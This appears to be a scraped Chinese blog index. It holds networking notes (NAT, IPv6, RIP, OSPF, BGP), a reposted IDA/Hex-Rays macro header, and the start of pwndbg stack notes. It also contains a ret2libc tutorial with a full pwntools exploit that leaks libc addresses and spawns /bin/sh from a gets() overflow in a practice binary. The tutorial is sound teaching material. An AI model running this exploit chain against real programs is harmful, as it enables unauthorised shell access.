但是如果本地地址和全球地址中某个地址重合，就会出现二义性问题\n专用于本地地址的地址块 这种网络又称为专用互联网、本地互联网、专用网 这种网络的地址又称为可重用地址 那本地网络内的主机如何与互联网上的其他主机进行通信（在不需要加密的情况下）呢？\n答案就是NAT转换\nNAT转换的具体内容 NAT实际上是本地网络和全球网络中间的媒介\n需要在专用网连接到互联网的路由器上安装 NAT 软件。装有 NAT 软件的路由器叫做 NAT路由器，它至少有一个有效的外部全球IP地址。 所有使用本地地址的主机在和外界通信时，都要在 NAT 路由器上将其本地地址转换成全球 IP 地址，才能和互联网连接。 因此，全球地址相当于一个房子的门，而房子里的各房间的门就是本地地址\nNAT：纯粹的地址转换，现实不使用 NAPT：加上端口一起转换\n如果没有NAT，主机A可以向主机B发送数据报，但是主机B发不回来，因为目的地址是本地地址\n纯NAT的计算方法 直接将数据报中的源IP地址（主机A的本地地址）替换为NAT中的全球地址，把转换结果记录到NAT地址转换表中\n当接收时，就根据NAT地址转换表将数据报转发给主机A\n纯NAT的局限 如果具有的全球IP地址数量小于主机数，本地地址要轮流使用全球地址 无法充当服务器使用：NAT地址转换表不确定，主机A又没有全球地址，主机B无法确定地访问主机A，导致单向性 NAPT的计算方法 只需要一个全球IP地址，不同主机的IP通过NAT路由器的端口号来区分\n本地地址+端口号 -\u0026gt; 全球地址+新端口号\n因此，NAPT是用端口号来区分不同的主机，而端口号又占用16位，可以支持六万多台本地主机\nNAPT的缺点 NAT是“有争议性”的、“临时”的解决手段\n路由器应至多只处理第三层；端口号是第四层的 地址短缺应由IPv6彻底解决，而不应该让NAT作临时解决 违背了端对端原则（end-to-end argument），应该让端系统负责智能而不是网络负责智能 NAT后的主机不能同时作为服务器向外提供服务 IPv6 IPv6 仍支持无连接的传送，但将协议数据单元 PDU 称为分组 到目前为止，IPv6 还只是草案标准阶段\nIPv6的特点 更大的地址空间。IPv6 将地址从 IPv4 的 32 位 增大到了 128 位。 扩展的地址层次结构。 灵活的首部格式。 IPv6 定义了许多可选的扩展首部。 改进的选项。 IPv6 允许数据报包含有选项的控制信息，其选项放在有效载荷中。 IPv6的首部 IPv6 首部改为 8 字节对齐，原来是4字节对齐，但首部长度是固定的\nIPv6数据报由基本首部和有效载荷两部分组成，有效载荷中允许有零个或多个扩展首部 (extension header)，再后面是数据部分\n与IPv4首部的差别是：\n❌首部长度（长度固定） ❌服务类型 总长度 -\u0026gt; 有效载荷长度 ❌标识、标志和片偏移 TTL -\u0026gt; 跳数限制字段 协议字段 -\u0026gt; 下一个首部字段 ❌检验和字段 ❌选项字段（使用扩展首部） 从而IPv6 首部的字段数减少到只有 8 个\nIPv6 把原来 IPv4 首部中选项的功能都放在扩展首部中，并将扩展首部留给路径两端的源站和目的站的主机来处理（把智能的事情交给端系统），经过的路由器都不处理这些扩展首部\nIPv6的地址 目的地址可以是：\n单播 多播 任播（新增，任播的终点是一组计算机，但数据报只交付其中的一个，通常是距离最近的一个） IPv6 将实现 IPv6 的主机和路由器均称为结点，一个结点就可能有多个与链路相连的接口，IPv6 地址是分配给结点上面的接口的。\n一个接口可以有多个单播地址。 其中的任何一个地址都可以当作到达该结点的目的地址。即一个结点接口的单播地址可用来唯一地标志该结点。 冒号十六进制记法 每个 16 位的值用十六进制值表示，各值之间用冒号分隔。例如：68E6:8C64:FFFF:FFFF:0:1180:960A:FFFF\n简写 在十六进制记法中，允许把数字前面的 0 省略。例如把 0000 中的前三个 0 省略，写成 1 个 0 每个地址允许且仅允许一次零压缩，即一连串连续的零可以为一对冒号所取代，如：FF05:0:0:0:0:0:0:B3 -\u0026gt; FF05::B3 特殊记法 冒号十六进制记法可结合使用点分十进制记法的后缀： 128.10.2.1 -\u0026gt; 0:0:0:0:0:0:128.10.2.1 -\u0026gt; ::128.10.2.1\nCIDR 的斜线表示法仍然可用： 60 位的前缀 12AB00000000CD3 可记为：12AB:0000:0000:CD30:0000:0000:0000:0000/60 -\u0026gt; 12AB::CD30:0:0:0:0/60 或 12AB:0:0:CD30::/60\n分类 未指明地址：这个地址只能为还没有配置到一个标准的 IP 地址的主机当作源地址使用 环回地址：127.0.0.1 多播地址：和IPv4一样 有些单位的网络使用 TCP/IP 协议，但并没有连接到互联网上。连接在这样的网络上的主机都可以使用这种本地地址进行通信，但不能和互联网上的其他主机通信。 全球单播地址：就是普通的全球通信IP 向IPv6过渡 有两种向 IPv6 过渡的策略，即使用双协议栈和使用隧道技术\n双协议栈 双协议栈主机在和 IPv6 主机通信时采用 IPv6 地址，而和 IPv4 主机通信时则采用 IPv4地址（使用域名系统DNS查询）\n当IPv6数据报转化为v4后再转回来时，有一部分首部无法恢复，只能空缺，这种信息的损失是使用首部转换方法所不可避免的\n隧道技术 在 IPv6 数据报要进入 IPv4 网络时，把 IPv6 数据报封装成为 IPv4数据报，现在整个的 IPv6 数据报变成了 IPv4 数据报的数据部分\n要使双协议栈的主机知道 IPv4 数据报里面封装的数据是一个 IPv6 数据报，就必须把IPv4 首部的协议字段的值设置为 41\n路由协议/算法 路由协议的目的：决定从起点（source address, sending host）到终点（destination address, receiving host）的，经过若干个路由器的，最佳路径\n理想的路由算法 正确的和完整的 简单 应能适应通信量和网络拓扑的变化（自适应性） 稳定性 公平 最佳 分层次的路由选择协议 使用原因 互联网的规模非常大 许多单位不愿意外界了解自己单位网络的布局细节和本部门所采用的路由选择协议（这属于本部门内部的事情），但同时还希望连接到互联网上 因此， 可以把整个互联网划分为许多较小的自治系统(autonomous system, AS)\n在目前的互联网中，一个大的 ISP 就是一个自治系统\n自治系统 AS 是在单一技术管理下的一组路由器，而这些路由器使用一种自治系统内部的路由选择协议和共同的度量 一个 AS 对其他 AS 表现出的是一个单一的和一致的路由选择策略 两类路由选择协议 内部网关协议 IGP (Interior Gateway Protocol)，如 RIP 和 OSPF 协议 外部网关协议 EGP (External Gateway Protocol)，目前使用最多的外部网关协议是 BGP 的版本 4（BGP-4） 因为历史原因，网关也可用于表示路由器\n自治系统之间的路由选择也叫做域间路由选择(interdomain routing)，而在自治系统内部的路由选择叫做域内路由选择(intradomain routing)\n【内部网关协议】路由信息协议 RIP协议 最先得到广泛使用的 分布式的、基于距离向量的 要求网络中的每一个路由器都要维护从它自己到其他每一个目的网络的距离记录 距离可以理解为跳数，取得是最短跳数 从一个路由器到直接连接的网络的距离定义为 1。 从一个路由器到非直接连接的网络的距离定义为所经过的路由器数加 1 RIP 允许一条路径最多只能包含 15 个路由器，也就是距离要小于等于15，“距离”的最大值为 16 时即相当于不可达 不能在两个网络之间同时使用多条路由 RIP 选择一个具有最少路由器的路由，哪怕另一条路由器多的路由更快 RIP的特点 仅和相邻路由器交换信息。 交换的信息是当前本路由器所知道的全部信息，即自己的路由表。 按固定的时间间隔交换路由信息，例如，每隔 30 秒。当网络拓扑发生变化时，路由器也及时向相邻路由器通告拓扑变化后的路由信息。 路由表的建立 路由器在刚刚开始工作时，只知道到直接连接的网络的距离（此距离定义为 1）。它的路由表是空的。 以后，每一个路由器也只和数目非常有限的相邻路由器交换并更新路由信息。 经过若干次更新后，所有的路由器最终都会知道到达本自治系统中任何一个网络的最短距离和下一跳路由器的地址。 RIP 协议的收敛 (convergence) 过程较快。“收敛”就是在自治系统中所有的结点都得到正确的路由选择信息的过程。\nRIP2协议报文格式 RIP协议的优缺点 优点：\n实现简单，开销较小。 缺点：\nRIP 限制了网络的规模，它能使用的最大距离为 15（16 表示不可达）。 路由器之间交换的路由信息是路由器中的完整路由表，因而随着网络规模的扩大，开销也就增加。 “坏消息传播得慢”，使更新过程的收敛时间过长。 【内部网关协议】开放最短路径优先 OSPF (Open Shortest Path First)协议 “开放”表明 OSPF 协议不是受某一家厂商控制，而是公开发表的。 “最短路径优先”是因为使用了 Dijkstra 提出的最短路径算法 SPF采用分布式的链路状态协议 (link state protocol) 三个要点 向本自治系统中所有路由器发送信息，这里使用的方法是洪泛法。 发送的信息就是与本路由器相邻的所有路由器的链路状态，但这只是路由器所知道的部分信息。 “链路状态”就是说明本路由器都和哪些路由器相邻，以及该链路的“度量”(metric)。 只有当链路状态发生变化时，路由器才用洪泛法向所有路由器发送此信息。 链路状态数据库 (link-state database) 是全网的拓扑结构图，它在全网范围内是一致的（这称为链路状态数据库的同步） 能较快地进行更新，使各个路由器能及时更新其路由表，因此更新过程收敛得快 OSPF的区域 OSPF 将一个自治系统再划分为若干个更小的范围，叫做区域。\n每一个区域都有一个用点分十进制表示的 32 位的区域标识符 在一个区域内的路由器最好不超过 200 个 区域分为两种，主干区域0.0.0.0和其他下层区域 划分区域的好处就是将利用洪泛法交换链路状态信息的范围局限于每一个区域而不是整个的自治系统，这就减少了整个网络上的通信量 因此，在一个区域内部的路由器只知道本区域的完整网络拓扑，而不知道其他区域的网络拓扑的情况\nOSPF的特点 OSPF 不用 UDP 而是直接用 IP 数据报传送。 OSPF 构成的数据报很短。这样做可减少路由信息的通信量 OSPF 对不同的链路可根据 IP 分组的不同服务类型 TOS 而设置成不同的代价。因此，OSPF 对于不同类型的业务可计算出不同的路由 如果到同一个目的网络有多条相同代价的路径，那么可以将通信量分配给这几条路径。这叫做多路径间的负载平衡。 所有在 OSPF 路由器之间交换的分组都具有鉴别的功能。 支持可变长度的子网划分和无分类编址 CIDR 每一个链路状态都带上一个 32 位的序号，序号越大状态就越新 OSPF 还规定每隔一段时间，如 30 分钟，要刷新一次数据库中的链路状态。 由于一个路由器的链路状态只涉及到与相邻路由器的连通状态，因而与整个互联网的规模并无直接关系。因此当互联网规模很大时，OSPF 协议要比距离向量协议 RIP 好得多。 OSPF 没有“坏消息传播得慢”的问题，据统计，其响应网络变化的时间小于 100 ms OSPF分组格式 五种类型：\n类型1，问候 (Hello) 分组。 类型2，数据库描述 (Database Description) 分组。 类型3，链路状态请求 (Link State Request) 分组。 类型4，链路状态更新 (Link State Update) 分组，洪泛法对全网更新链路状态。 类型5，链路状态确认 (Link State Acknowledgment)分组。 指定的路由器 多点接入的局域网采用了指定的路由器 (designated router) 的方法，使广播的信息量大大减少。 指定的路由器代表该局域网上所有的链路向连接到该网络上的各路由器发送状态信息 与RIP的对比 【外部网关协议】BGP协议 BGP 是不同自治系统的路由器之间交换路由信息的协议\n边界网关协议 BGP 力求寻找一条能够到达目的网络且比较好的路由（不能兜圈子），而并非要寻找一条最佳路由\nBGP发言人 每一个自治系统的管理员要选择至少一个路由器作为该自治系统的 “ BGP 发言人” (BGP speaker)\n一般说来，两个 BGP 发言人都是通过一个共享网络连接在一起的，而 BGP 发言人往往就是 BGP 边界路由器，但也可以不是 BGP 边界路由器\nBGP交换路由信息 一个 BGP 发言人与其他自治系统中的 BGP 发言人要交换路由信息，就要先建立 TCP 连接，然后在此连接上交换 BGP 报文以建立 BGP 会话(session)，利用 BGP 会话交换路由信息。\n使用 TCP 连接能提供可靠的服务，也简化了路由选择协议。 使用 TCP 连接交换路由信息的两个 BGP 发言人，彼此成为对方的邻站(neighbor)或对等站(peer) 。 BGP发言人交换路径向量 BGP协议的特点 BGP协议的四种报文 BGP协议报文格式 两类基本路由算法 网络的图的抽象 链路成本 要找到从起点到终点的最小成本的路径，这就是路由算法需要解决的问题\n路由算法的分类 根据路由算法是需要中心化的、全局的信息，还是去中心化的、局部的信息，可以分为两类：\n链路状态算法（知道全局信息） 距离向量算法（只知道局部信息） 链路状态算法 距离向量算法 当链路成本发生变化时：\n“好消息传得快”：链路成本变小 “坏消息传得慢”：链路成本变大、链路断了等等，可能会造成路由环路 为了避免路由环路，可以使用毒性逆转： 如果z -\u0026gt; y -\u0026gt; x，则z向y通告$𝐷_𝑧(𝑥)=∞$（即使z知道$𝐷_𝑧 (𝑥)$是某个数值）。这样可以防止y重新经过z到达x。\n","date":"2022年11月16日","permalink":"https://peterliuzhi.top/principle/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%B1%82/","section":"principle","summary":"It isn\u0026rsquo;t where you come from, it\u0026rsquo;s where you\u0026rsquo;re going that counts. — Ella Fitzgerald 链路层干的事情是局部的，网络层干的事情是全局的 网络层 概述 网络层提供的服务 路由和转发 网络层提供的两种分组交换的方法 数据报方","tags":["计算机网络"],"title":"网络层"},{"categories":["principle"],"contents":" All serious daring starts from within. — Harriet Beecher Stowe\n本文转载自IDA逆向常用宏定义_丑大狗的博客-CSDN博客\n/* This file [contains](https://so.csdn.net/so/search?q=contains\u0026amp;spm=1001.2101.3001.7020) definitions used by the Hex-Rays decompiler output. It has type definitions and convenience macros to make the output more readable. Copyright © 2007-2011 Hex-Rays */ #if defined(**GNUC**) typedef long long ll; typedef unsigned long long ull; #define __int64 long long #define __int32 int #define __int16 short #define __int8 char #define MAKELL(num) num ## LL #define FMT_64 “ll” #elif defined(_MSC_VER) typedef __int64 ll; typedef unsigned __int64 ull; #define MAKELL(num) num ## i64 #define FMT_64 “I64” #elif defined (**BORLANDC**) typedef __int64 ll; typedef unsigned __int64 ull; #define MAKELL(num) num ## i64 #define FMT_64 “L” #else #error “unknown compiler” #endif typedef unsigned int uint; typedef unsigned char uchar; typedef unsigned short ushort; typedef unsigned long ulong; typedef char int8; typedef signed char sint8; typedef unsigned char uint8; typedef short int16; typedef signed short sint16; typedef unsigned short uint16; typedef int int32; typedef signed int sint32; typedef unsigned int uint32; typedef ll int64; typedef ll sint64; typedef ull uint64; // Partially defined types: #define _BYTE uint8 #define _WORD uint16 #define _DWORD uint32 #define _QWORD uint64 #if !defined(_MSC_VER) #define _LONGLONG __int128 #endif #ifndef _WINDOWS_ typedef int8 BYTE; typedef int16 WORD; typedef int32 DWORD; typedef int32 LONG; #endif typedef int64 QWORD; #ifndef __cplusplus typedef int bool; // we want to use bool in our C programs #endif // Some convenience macros to make partial accesses nicer // first unsigned macros: #define LOBYTE(x) (_((_BYTE_)\u0026amp;(x))) // low byte #define LOWORD(x) (_((_WORD_)\u0026amp;(x))) // low word #define LODWORD(x) (_((_DWORD_)\u0026amp;(x))) // low dword #define HIBYTE(x) (_((_BYTE_)\u0026amp;(x)+1)) #define HIWORD(x) (_((_WORD_)\u0026amp;(x)+1)) #define HIDWORD(x) (_((_DWORD_)\u0026amp;(x)+1)) #define BYTEn(x, n) (_((_BYTE_)\u0026amp;(x)+n)) #define WORDn(x, n) (_((_WORD_)\u0026amp;(x)+n)) #define BYTE1(x) BYTEn(x, 1) // byte 1 (counting from 0) #define BYTE2(x) BYTEn(x, 2) #define BYTE3(x) BYTEn(x, 3) #define BYTE4(x) BYTEn(x, 4) #define BYTE5(x) BYTEn(x, 5) #define BYTE6(x) BYTEn(x, 6) #define BYTE7(x) BYTEn(x, 7) #define BYTE8(x) BYTEn(x, 8) #define BYTE9(x) BYTEn(x, 9) #define BYTE10(x) BYTEn(x, 10) #define BYTE11(x) BYTEn(x, 11) #define BYTE12(x) BYTEn(x, 12) #define BYTE13(x) BYTEn(x, 13) #define BYTE14(x) BYTEn(x, 14) #define BYTE15(x) BYTEn(x, 15) #define WORD1(x) WORDn(x, 1) #define WORD2(x) WORDn(x, 2) // third word of the object, unsigned #define WORD3(x) WORDn(x, 3) #define WORD4(x) WORDn(x, 4) #define WORD5(x) WORDn(x, 5) #define WORD6(x) WORDn(x, 6) #define WORD7(x) WORDn(x, 7) // now signed macros (the same but with sign extension) #define SLOBYTE(x) (_((int8_)\u0026amp;(x))) #define SLOWORD(x) (_((int16_)\u0026amp;(x))) #define SLODWORD(x) (_((int32_)\u0026amp;(x))) #define SHIBYTE(x) (_((int8_)\u0026amp;(x)+1)) #define SHIWORD(x) (_((int16_)\u0026amp;(x)+1)) #define SHIDWORD(x) (_((int32_)\u0026amp;(x)+1)) #define SBYTEn(x, n) (_((int8_)\u0026amp;(x)+n)) #define SWORDn(x, n) (_((int16_)\u0026amp;(x)+n)) #define SBYTE1(x) SBYTEn(x, 1) #define SBYTE2(x) SBYTEn(x, 2) #define SBYTE3(x) SBYTEn(x, 3) #define SBYTE4(x) SBYTEn(x, 4) #define SBYTE5(x) SBYTEn(x, 5) #define SBYTE6(x) SBYTEn(x, 6) #define SBYTE7(x) SBYTEn(x, 7) #define SBYTE8(x) SBYTEn(x, 8) #define SBYTE9(x) SBYTEn(x, 9) #define SBYTE10(x) SBYTEn(x, 10) #define SBYTE11(x) SBYTEn(x, 11) #define SBYTE12(x) SBYTEn(x, 12) #define SBYTE13(x) SBYTEn(x, 13) #define SBYTE14(x) SBYTEn(x, 14) #define SBYTE15(x) SBYTEn(x, 15) #define SWORD1(x) SWORDn(x, 1) #define SWORD2(x) SWORDn(x, 2) #define SWORD3(x) SWORDn(x, 3) #define SWORD4(x) SWORDn(x, 4) #define SWORD5(x) SWORDn(x, 5) #define SWORD6(x) SWORDn(x, 6) #define SWORD7(x) SWORDn(x, 7) // Helper functions to represent some assembly instructions. #ifdef __cplusplus // Fill memory block with an integer value inline void memset32(void *ptr, uint32 value, int count) { uint32 *p = (uint32 *)ptr; for ( int i=0; i \u0026lt; count; i++ ) *p++ = value; } // Generate a reference to pair of operands template int16 **PAIR**( int8 high, T low) { return ((( int16)high) \u0026lt;\u0026lt; sizeof(high)*8) | uint8(low); } template int32 **PAIR**( int16 high, T low) { return ((( int32)high) \u0026lt;\u0026lt; sizeof(high)*8) | uint16(low); } template int64 **PAIR**( int32 high, T low) { return ((( int64)high) \u0026lt;\u0026lt; sizeof(high)*8) | uint32(low); } template uint16 **PAIR**(uint8 high, T low) { return (((uint16)high) \u0026lt;\u0026lt; sizeof(high)*8) | uint8(low); } template uint32 **PAIR**(uint16 high, T low) { return (((uint32)high) \u0026lt;\u0026lt; sizeof(high)*8) | uint16(low); } template uint64 **PAIR**(uint32 high, T low) { return (((uint64)high) \u0026lt;\u0026lt; sizeof(high)*8) | uint32(low); } // rotate left template T **ROL**(T value, uint count) { const uint nbits = sizeof(T) * 8; count %= nbits; T high = value \u0026gt;\u0026gt; (nbits - count); value \u0026lt;\u0026lt;= count; value |= high; return value; } // rotate right template T **ROR**(T value, uint count) { const uint nbits = sizeof(T) * 8; count %= nbits; T low = value \u0026lt;\u0026lt; (nbits - count); value \u0026gt;\u0026gt;= count; value |= low; return value; } // carry flag of left shift template int8 **MKCSHL**(T value, uint count) { const uint nbits = sizeof(T) * 8; count %= nbits; return (value \u0026gt;\u0026gt; (nbits-count)) \u0026amp; 1; } // carry flag of right shift template int8 **MKCSHR**(T value, uint count) { return (value \u0026gt;\u0026gt; (count-1)) \u0026amp; 1; } // sign flag template int8 **SETS**(T x) { if ( sizeof(T) == 1 ) return int8(x) \u0026lt; 0; if ( sizeof(T) == 2 ) return int16(x) \u0026lt; 0; if ( sizeof(T) == 4 ) return int32(x) \u0026lt; 0; return int64(x) \u0026lt; 0; } // overflow flag of subtraction (x-y) template\u0026lt;class T, class U\u0026gt; int8 **OFSUB**(T x, U y) { if ( sizeof(T) \u0026lt; sizeof(U) ) { U x2 = x; int8 sx = **SETS**(x2); return (sx ^ **SETS**(y)) \u0026amp; (sx ^ **SETS**(x2-y)); } else { T y2 = y; int8 sx = **SETS**(x); return (sx ^ **SETS**(y2)) \u0026amp; (sx ^ **SETS**(x-y2)); } } // overflow flag of addition (x+y) template\u0026lt;class T, class U\u0026gt; int8 **OFADD**(T x, U y) { if ( sizeof(T) \u0026lt; sizeof(U) ) { U x2 = x; int8 sx = **SETS**(x2); return ((1 ^ sx) ^ **SETS**(y)) \u0026amp; (sx ^ **SETS**(x2+y)); } else { T y2 = y; int8 sx = **SETS**(x); return ((1 ^ sx) ^ **SETS**(y2)) \u0026amp; (sx ^ **SETS**(x+y2)); } } // carry flag of subtraction (x-y) template\u0026lt;class T, class U\u0026gt; int8 **CFSUB**(T x, U y) { int size = sizeof(T) \u0026gt; sizeof(U) ? sizeof(T) : sizeof(U); if ( size == 1 ) return uint8(x) \u0026lt; uint8(y); if ( size == 2 ) return uint16(x) \u0026lt; uint16(y); if ( size == 4 ) return uint32(x) \u0026lt; uint32(y); return uint64(x) \u0026lt; uint64(y); } // carry flag of addition (x+y) template\u0026lt;class T, class U\u0026gt; int8 **CFADD**(T x, U y) { int size = sizeof(T) \u0026gt; sizeof(U) ? sizeof(T) : sizeof(U); if ( size == 1 ) return uint8(x) \u0026gt; uint8(x+y); if ( size == 2 ) return uint16(x) \u0026gt; uint16(x+y); if ( size == 4 ) return uint32(x) \u0026gt; uint32(x+y); return uint64(x) \u0026gt; uint64(x+y); } #else // The following definition is not quite correct because it always returns // uint64. The above C++ functions are good, though. #define **PAIR**(high, low) (((uint64)(high)\u0026lt;\u0026lt;sizeof(high)*8) | low) // For C, we just provide macros, they are not quite correct. #define **ROL**(x, y) **rotl**(x, y) // Rotate left #define **ROR**(x, y) **rotr**(x, y) // Rotate right #define **CFSHL**(x, y) invalid_operation // Generate carry flag for (x\u0026lt;\u0026lt;y) #define **CFSHR**(x, y) invalid_operation // Generate carry flag for (x\u0026gt;\u0026gt;y) #define **CFADD**(x, y) invalid_operation // Generate carry flag for (x+y) #define **CFSUB**(x, y) invalid_operation // Generate carry flag for (x-y) #define **OFADD**(x, y) invalid_operation // Generate overflow flag for (x+y) #define **OFSUB**(x, y) invalid_operation // Generate overflow flag for (x-y) #endif // No definition for rcl/rcr because the carry flag is unknown #define **RCL**(x, y) invalid_operation // Rotate left thru carry #define **RCR**(x, y) invalid_operation // Rotate right thru carry #define **MKCRCL**(x, y) invalid_operation // Generate carry flag for a RCL #define **MKCRCR**(x, y) invalid_operation // Generate carry flag for a RCR #define **SETP**(x, y) invalid_operation // Generate parity flag for (x-y) // In the decompilation listing there are some objects declarared as _UNKNOWN // because we could not determine their types. Since the C compiler does not // accept void item declarations, we replace them by anything of our choice, // for example a char: #define _UNKNOWN char #ifdef _MSC_VER #define snprintf _snprintf #define vsnprintf _vsnprintf #endif ","date":"2022年10月30日","permalink":"https://peterliuzhi.top/tricks/%E5%B8%B8%E8%A7%81%E5%AE%8F%E5%AE%9A%E4%B9%89/","section":"tricks","summary":"All serious daring starts from within. — Harriet Beecher Stowe 本文转载自IDA逆向常用宏定义_丑大狗的博客-CSDN博客 /* This file [contains](https://so.csdn.net/so/search?q=contains\u0026amp;spm=1001.2101.3001.7020) definitions used by the Hex-Rays decompiler output. It has type definitions and convenience macros to make the output more readable. Copyright © 2007-2011 Hex-Rays */ #if defined(**GNUC**) typedef long long ll; typedef","tags":["pwn","ida","宏"],"title":"常见宏定义"},{"categories":["principle"],"contents":" And as we let our own light shine, we unconsciously give other people permission to do the same. — Nelson Mandela\nreturn to libc(ret2libc) GOT\u0026amp;PLT 例题 分析 如何 leak 出基址？ 计算出 system 和\u0026quot;/bin/sh\u0026quot;的真实地址 构造第二个 payload 以获取系统权限 可能出现的坑 全部代码 当程序由于没有后门函数等原因无法直接栈溢出时，我们可以利用 puts、write、printf 这种输出函数来得到程序动态链接的 libc 基址（段地址），然后通过虚拟内存计算偏移得到 system、/bin/sh 的真实地址，就可以通过安排栈来实现调用 system 函数\n详细教程敬请查看该教程！感谢这位作者的付出！ 同时，感谢为我解惑并和我一起探讨问题根源的几位大佬！\nGOT\u0026amp;PLT GOT：Global Offsets Table，一开始储存 PLT 表中相对于真实地址的偏移量，当该函数调用过一次后，就储存真实地址的指针，这样调用的时候就不用再计算一次偏移量，直接就能调用外部函数了 PLT：Procedure Linkage Table，保存着函数的虚拟地址 例题 #include \u0026lt;stdio.h\u0026gt; int main { char buffer[32]; puts(\u0026#34;Simple ROP.\\n\u0026#34;); gets(buffer); return 0; } 二进制文件\n分析 当我们看到这道题的时候，我们发现了一个 puts 函数，这是一个输出函数，只要我们能够通过该函数输出 puts 函数的真实地址，这样我们就可以通过 libc 的符号表提供的偏移量计算出 libc 的基址，从而计算得到 system 和\u0026quot;/bin/sh\u0026quot;的真实地址\n如何 leak 出基址？ main_addr= elf.sym[\u0026#34;main\u0026#34;] # 这两个地址通过ROPgadget --binary vuln --only \u0026#34;pop|ret\u0026#34;找到 # 这两个属于常用的小片段 # 如果该程序中没有pop rdi;ret这个gadget，就不能用常规的思路，需要变更思路了 pop_rdi_addr = 0x4011f3 ret_addr = 0x40101a puts_plt = elf.plt[\u0026#34;puts\u0026#34;] puts_got = elf.got[\u0026#34;puts\u0026#34;] # 这里的offset为40，也就是0x28 payload1=b\u0026#39;a\u0026#39;*0x28+ p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr) 此时，如果没有出问题的话，程序应该打印出了一串 bytes，我们接收这段 bytes，然后通过p.recv(6)+b'\\x00\\x00'我们就能计算出puts的真实地址\n加两个\\x00 是为了对齐\n计算出 system 和\u0026quot;/bin/sh\u0026quot;的真实地址 此时我们已经有了puts的真实地址了，我们减去符号表中puts的偏移量，就能得到基址了\n同样的逻辑，加上system和\u0026quot;/bin/sh\u0026quot;的偏移量就是它俩的真实地址了。\nlibc_base = puts_addr-libc.sym[\u0026#39;puts\u0026#39;] success(\u0026#34;libc_base:\u0026#34;+hex(libc_base)) system_addr = libc_base+libc.sym[\u0026#39;system\u0026#39;] bin_sh_addr = libc_base+next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) success(\u0026#34;system_addr:\u0026#34;+hex(system_addr)) success(\u0026#34;bin_sh_addr:\u0026#34;+hex(bin_sh_addr)) 构造第二个 payload 以获取系统权限 我们得到了需要用到的函数和函数需要使用的参数，我们现在只需要在返回值中填入适当的指令就能让程序运行我们想运行的函数了\n需要注意的是，此时我们需要注意栈对齐的情况。因为栈指针 rsp 每一次移动都是+8，所以栈地址末尾不是 8 就是 0。而要正常调用 system，就要保证最后退出时栈的最后一位地址是 0，所以我们需要在pop rdi;ret之前调用一次ret，这样既能正常执行下一句指令（将下一句指令传给了 rip），又能保证退出时栈的最后一位为 0 \u0026gt; 更多信息请查阅该博文！感谢这位作者的付出！\n可能出现的坑 程序中找不到pop rdi;ret的地址，只有pop rbp;ret的地址：编译有问题，可能是 gcc 版本导致的，可以使用我提供的二进制文件\n全部代码 from pwn import * from pwn import p64 context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;,os=\u0026#39;linux\u0026#39;) p = process(\u0026#39;./vuln1\u0026#39; ) # gdb.attach(p) p.recvuntil(\u0026#34;Simple ROP.\\n\\n\u0026#34;) elf = ELF(\u0026#39;./vuln1\u0026#39; ) libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) main_addr= elf.sym[\u0026#34;main\u0026#34;] pop_rdi_addr = 0x4011f3 ret_addr = 0x40101a puts_plt = elf.plt[\u0026#34;puts\u0026#34;] puts_got = elf.got[\u0026#34;puts\u0026#34;] success(f\u0026#34;puts_plt:{hex(puts_plt)}\u0026#34;) success(f\u0026#34;puts_got:{hex(puts_got)}\u0026#34;) payload1=b\u0026#39;a\u0026#39;*0x28+ p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr) success(f\u0026#34;payload1:{payload1}\u0026#34;) p.sendline(payload1) received = p.recv(6) print(received) puts_addr = u64(received+b\u0026#39;\\x00\\x00\u0026#39;) print(puts_addr) print(type(puts_addr)) success(\u0026#34;puts_addr:\u0026#34;+hex(puts_addr)) libc_base = puts_addr-libc.sym[\u0026#39;puts\u0026#39;] success(\u0026#34;libc_base:\u0026#34;+hex(libc_base)) system_addr = libc_base+libc.sym[\u0026#39;system\u0026#39;] bin_sh_addr = libc_base+next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) success(\u0026#34;system_addr:\u0026#34;+hex(system_addr)) success(\u0026#34;bin_sh_addr:\u0026#34;+hex(bin_sh_addr)) payload2=b\u0026#39;a\u0026#39;*40+p64(ret_addr)+p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr) p.sendline(payload2) p.interactive() ","date":"2022年10月26日","permalink":"https://peterliuzhi.top/principle/ret2libc/","section":"principle","summary":"And as we let our own light shine, we unconsciously give other people permission to do the same. — Nelson Mandela return to libc(ret2libc) GOT\u0026amp;PLT 例题 分析 如何 leak 出基址？ 计算出 system 和\u0026quot;/bin/sh\u0026quot;的真实地址 构造第二个 payload 以获取系","tags":["pwn"],"title":"ret2libc"},{"categories":["principle"],"contents":" When we feel love and kindness toward others, it not only makes others feel loved and cared for, but it helps us also to develop inner happiness and peace. — Dalai Lama\npwndbg中显示的栈 最上方的rsp rbp栈帧指针 栈的高低区别 CALL函数 一个关于函数调用的比喻 在这个比喻的基础上解释栈溢出 在这个比喻的基础上解释局部变量 总结 pwndbg中显示的栈 ✨pwndbg中默认只显示8行stack，这在很多时候是不够用的-\u0026gt;输入stact 10显示10行，stack 20显示20行，以此类推\n最上方的rsp rsp就是栈顶指针，时刻指向当前的栈顶，pop和push后就会变化\n✨pwndbg中的栈更符合栈的概念，栈越往上则地址越小，因此低位在上，高位在下；而ida中双击变量后显示的栈则显示的是该变量的地址距离栈顶的地址差，因此有正负之分 ❔pwndbg中的栈还有很多小箭头，这是什么意思？\n这些小箭头可以理解为指针的意思，如果是'→'，表示该地址的这个位置存储的是一个地址，如果是'←'，表示存储的是数据，\n黄色表示是栈上地址，红色上色表示代码段，黑色为数据，\n有些数据还会有箭头指向别的数据，这些是“该位置存储的地址的位置存储的数据”\nfor example: 表示0x7fffffffde50这个位置存储的数据是0x7fffffffdf78,同时0x7fffffffdf78这个位置存储的数据是0x7fffffffe2da,0x7fffffffe2da这个位置存储的数据是\"/home/linux/0/pwn/30\"\n而这种寄存器符号在左边的标识，表示当前r12的值为0x7fffffffdf78，每次pop就会从栈顶弹出一个数据到对应的寄存器中，同时rsp会+8,也就是显示为往下移一行。 rbp栈帧指针 